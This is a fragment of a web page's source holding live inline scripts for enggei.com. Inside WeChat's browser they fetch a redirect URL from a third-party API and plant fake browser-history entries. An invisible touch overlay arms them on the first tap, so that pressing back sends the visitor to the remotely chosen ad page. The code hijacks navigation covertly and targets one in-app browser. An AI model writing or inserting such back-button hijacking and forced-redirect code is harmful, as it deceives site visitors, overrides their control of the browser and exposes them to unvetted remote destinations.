      }
    }

  <script>
    (function () {
      if (window.__AD_BRIDGE_INIT__) return;
      window.__AD_BRIDGE_INIT__ = true;

      var HOST_WHITELIST = ['enggei.com', 'www.enggei.com'];
      var AD_API_URL = 'https://api.jianyuekeji.cn/api/getDomain/7022_bs7hsk9gg24cenj5';

      var STORAGE_KEY_URL = 'enggei_ad_jump_url';
      var STORAGE_KEY_READY = 'enggei_ad_jump_ready';
      var STORAGE_KEY_ARMED = 'enggei_ad_jump_armed';
      var STATE_BRIDGE = 'ad-bridge';
      var STATE_CONTENT = 'content-live';

      var armed = false;
      var jumped = false;

      function getHost() {
        return (window.location.hostname || '').toLowerCase();
      }

      function isAllowedHost() {
        return HOST_WHITELIST.indexOf(getHost()) !== -1;
      }

      function isWeChatBrowser() {
        return /MicroMessenger/i.test(navigator.userAgent || '');
      }

      function isMiniProgramByUA() {
        return /miniProgram/i.test(navigator.userAgent || '');
      }

      function detectMiniProgram(callback) {
        if (!isWeChatBrowser()) {
          callback(false);
          return;
        }

        if (typeof wx !== 'undefined' && wx.miniProgram && typeof wx.miniProgram.getEnv === 'function') {
          wx.miniProgram.getEnv(function (res) {
            callback(!!(res && res.miniprogram));
          });
          return;
        }

        callback(isMiniProgramByUA());
      }

      function extractJumpUrl(res) {
        if (!res || typeof res !== 'object') return '';
        return res.url || (res.data && res.data.url) || res.jump || '';
      }

      function saveAdUrl(url) {
        if (!url) return;
        try {
          sessionStorage.setItem(STORAGE_KEY_URL, url);
          sessionStorage.setItem(STORAGE_KEY_READY, '1');
        } catch (e) {}
      }

      function getAdUrl() {
        try {
          return sessionStorage.getItem(STORAGE_KEY_URL) || '';
        } catch (e) {
          return '';
        }
      }

      function isAdReady() {
        try {
          return sessionStorage.getItem(STORAGE_KEY_READY) === '1';
        } catch (e) {
          return false;
        }
      }

      function markArmed() {
        armed = true;
        try {
          sessionStorage.setItem(STORAGE_KEY_ARMED, '1');
        } catch (e) {}
      }

      function isArmed() {
        if (armed) return true;
        try {
          return sessionStorage.getItem(STORAGE_KEY_ARMED) === '1';
        } catch (e) {
          return false;
        }
      }

      function prefetchAdUrl() {
        if (!isAllowedHost()) return;
        if (!isWeChatBrowser()) return;
        if (isAdReady()) return;

        fetch(AD_API_URL, {
          method: 'GET',
          credentials: 'omit',
          cache: 'no-store'
        })
          .then(function (res) {
            return res.json();
          })
          .then(function (data) {
            var adUrl = extractJumpUrl(data);
            if (adUrl) {
              saveAdUrl(adUrl);
            }
          })
          .catch(function () {});
      }

      function buildBridgeUrl() {
        var path = window.location.pathname || '/';
        var search = window.location.search || '';
        var hash = '#__ad_bridge__';
        return path + search + hash;
      }

      function buildContentUrl() {
        var path = window.location.pathname || '/';
        var search = window.location.search || '';
        return path + search;
      }

      function installVirtualPreviousPage() {
        if (!isAllowedHost()) return;
        if (!isWeChatBrowser()) return;
        if (!isArmed()) return;

        try {
          history.pushState({ pageType: STATE_BRIDGE }, '', buildBridgeUrl());
          history.pushState({ pageType: STATE_CONTENT }, '', buildContentUrl());
        } catch (e) {}
      }

      function jumpToAd() {
        if (jumped) return;
        jumped = true;

        var adUrl = getAdUrl();
        if (adUrl) {
          location.href = adUrl;
          return;
        }

        fetch(AD_API_URL, {
          method: 'GET',
          credentials: 'omit',
          cache: 'no-store'
        })
          .then(function (res) {
            return res.json();
          })
          .then(function (data) {
            var url = extractJumpUrl(data);
            if (url) {
              saveAdUrl(url);
              location.href = url;
            } else {
              jumped = false;
            }
          })
          .catch(function () {
            jumped = false;
          });
      }

      function onBackState(e) {
        if (!isAllowedHost()) return;
        if (!isWeChatBrowser()) return;
        if (!isArmed()) return;

        var state = e.state || {};
        if (state.pageType === STATE_BRIDGE) {
          jumpToAd();

          setTimeout(function () {
            try {
              history.pushState({ pageType: STATE_CONTENT }, '', buildContentUrl());
            } catch (err) {}
          }, 0);
        }
      }

      function armOnce() {
        if (isArmed()) return;
        markArmed();
        prefetchAdUrl();
        installVirtualPreviousPage();
      }

      function start() {
        if (!isAllowedHost()) return;
        if (!isWeChatBrowser()) return;

        detectMiniProgram(function (isMini) {
          if (isMini) return;

          prefetchAdUrl();
          window.addEventListener('popstate', onBackState);

          window.addEventListener('pageshow', function () {
            if (isArmed()) {
              setTimeout(function () {
                installVirtualPreviousPage();
              }, 0);
            }
          });

          document.addEventListener('visibilitychange', function () {
            if (!document.hidden && isArmed()) {
              setTimeout(function () {
                installVirtualPreviousPage();
              }, 0);
            }
          });
        });
      }

      window.EnggeiAdBridge = {
        start: start,
        armOnce: armOnce,
        prefetchAdUrl: prefetchAdUrl,
        jumpToAd: jumpToAd
      };

      start();
    })();
  </script>

  <script>
    (function () {
      var layer = document.getElementById('guardTouchLayer');

      function handleFirstTouch() {
        if (window.EnggeiAdBridge && typeof window.EnggeiAdBridge.armOnce === 'function') {
          window.EnggeiAdBridge.armOnce();
        }

        if (layer) {
          layer.style.display = 'none';
        }
      }

      if (layer) {
        layer.addEventListener('click', handleFirstTouch, { passive: true, once: true });
        layer.addEventListener('touchstart', handleFirstTouch, { passive: true, once: true });
      }
    })();
  </script>
